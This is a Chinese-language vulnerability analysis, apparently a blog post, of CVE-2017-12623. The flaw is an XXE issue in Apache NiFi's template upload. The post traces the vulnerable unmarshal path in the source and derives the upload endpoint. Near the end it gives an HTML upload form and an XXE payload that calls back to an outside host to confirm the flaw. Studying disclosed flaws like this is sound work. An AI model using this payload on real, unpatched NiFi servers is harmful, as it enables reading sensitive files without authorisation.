<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h3 data-content="1" id="992cd25039e57a5084ea3bbb6d6272ff">漏洞描述</h3>
<p>CVE-2017-12623: Apache NiFi XXE issue in template XML upload<br/>
Severity:  Important<br/>
Versions Affected:<br/>
<em>Apache NiFi 1.0.0 - 1.3.0</em><br/>
Description:  Any authenticated user (valid client certificate but without ACL permissions) could upload a template which contained malicious code and accessed sensitive files via an XML External Entity (XXE) attack.<br/>
Mitigation: The fix to properly handle XML External Entities was applied on the Apache NiFi 1.4.0 release. Users running a prior 1.x release should upgrade to the appropriate release.<br/>
Credit: This issue was discovered by Paweł Gocyla and further information was provided by Mike Cole.<br/>
Released: October 2, 2017 (Updated January 23, 2018)</p>
<h3 data-content="1" id="916e52992cfad013b8a563ca45eeb646">Apache NiFi</h3>
<p>Apache NiFi 是一个易于使用、功能强大而且可靠的数据处理和分发系统。Apache NiFi 是为数据流设计，它支持高度可配置的指示图的数据路由、转换和系统中介逻辑，支持从多种数据源动态拉取数据。简单地说，NiFi是为自动化系统之间的数据流而生。 这里的数据流表示系统之间的自动化和受管理的信息流。 基于WEB图形界面，通过拖拽、连接、配置完成基于流程的编程，实现数据采集、处理等功能。</p>
<h3 data-content="1" id="25404061b277dd126782ea0cf5e8b61f">触发流程</h3>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180211122707-d1ec5fec-0ee3-1.png"/></p>
<h3 data-content="1" id="e58712a41db2e816acd80dc6f969b4e7">分析过程</h3>
<p>照着漏洞描述里说的，有几个关键字：upload、template</p>
<p>直接全局搜一下，在搜索 template 关键字的时候，发现如下图</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180211122714-d6438ff2-0ee3-1.png"/></p>
<p>有个 jsp 文件里的表单，这感觉和漏洞似乎有点关联<br/>
可以看见 file 的 name 属性是 template，但是直接搜的 template 信息太多太乱</p>
<p>平时在写代码时，引入一个外部请求数据时，都会是根据其属性名来得到相关值，比如 php 里的 $_POST['name'] 类似，java 里只能用双引号去包裹字符串，那么试试搜索 <code>"template"</code>，这样筛选范围就小了很多，找到如下图</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180211122724-dc04508e-0ee3-1.png"/></p>
<p>跟进去看看</p>
<p>路由和描述信息：</p>
<p>部分函数体如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180211122802-f2c15b0a-0ee3-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180211122804-f3f61218-0ee3-1.png"/></p>
<p>这里就把上传的数据带入了 unmarshal 函数了</p>
<p>通过跟踪，跟入了 com.sun.xml.internal.bind.v2.runtime.unmarshaller.UnmarshallerImpl 中</p>
<p>函数如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180211122814-f9d5f7e8-0ee3-1.png"/></p>
<p>其中 source 是 StreamSource 类型的，继续跟入</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180211122821-fe21ed48-0ee3-1.png"/></p>
<p>expectedType 指定的是 TemplateDTO.class<br/>
所以进入 else 分支，注意 reader 已经是 XMLReader 类型的了</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180211122829-02e8c86a-0ee4-1.png"/></p>
<p>对其进行相关设置后，就进行 parse 操作，在此之前，我们需要看一看 setContentHandler 中的 connector ，因为这个可以自定义解析方式和设置相关的 xxe 防御</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180211122837-079bdbae-0ee4-1.png"/></p>
<p>如上图，在实例化 SAXConnector 的过程中，并没有进行相关防御设置，最多只是防止了由 xml 解析造成的 dos</p>
<p>现在是确认了这里是存在 xxe 的，那么需要找到 这个功能 的访问路径</p>
<p>在之前已知了 Path</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180211122841-09e95c38-0ee4-1.png"/></p>
<p>但这还不够，需要看下当前文件的开头</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180211122847-0d801a08-0ee4-1.png"/></p>
<p>我们再看一下目录</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180211122853-10d6a384-0ee4-1.png"/></p>
<p>去这两个目录看看</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180211122857-13a2784a-0ee4-1.png"/></p>
<p>nifi-web 下并没有发现任何有关 web 的设置，那么去看看下 nifi-web-api</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180211122904-17b3dfe6-0ee4-1.png"/></p>
<p>打开</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180211122919-20a0a1fc-0ee4-1.png"/></p>
<p><code>nifi-api</code> ，OK~</p>
<p>与之前的 Path 合起来就是</p>
<p><code>nifi-api/process-groups/{id}/templates/upload</code></p>
<p>nifi 在本地启动后，附着在 8080 端口</p>
<p>打一发，表单：</p>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">"http://localhost:8080/nifi-api/process-groups/1/templates/upload/"</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"multipart/form-data"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"file"</span> <span class="na">name</span><span class="o">=</span><span class="s">"template"</span> <span class="na">id</span><span class="o">=</span><span class="s">"template-file-field"</span><span class="p">/&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">name</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"Submit"</span> <span class="p">/&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div>
<p>payload 如下：</p>
<pre><code>&lt;!DOCTYPE ANY SYSTEM "http://192.168.204.142:9999/nifi_xxe_test"&gt;
&lt;a&gt;orich1&lt;/a&gt;</code></pre>
<p>结果如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180211122952-3437af30-0ee4-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180211122957-37613186-0ee4-1.png"/></p>
<p>nifi 相关信息：<a href="http://blog.csdn.net/mearsedy/article/details/78178083" target="_blank">http://blog.csdn.net/mearsedy/article/details/78178083</a><br/>
漏洞信息：<a href="http://nifi.apache.org/security.html#CVE-2017-12623" target="_blank">http://nifi.apache.org/security.html#CVE-2017-12623</a></p>
</div>
</div>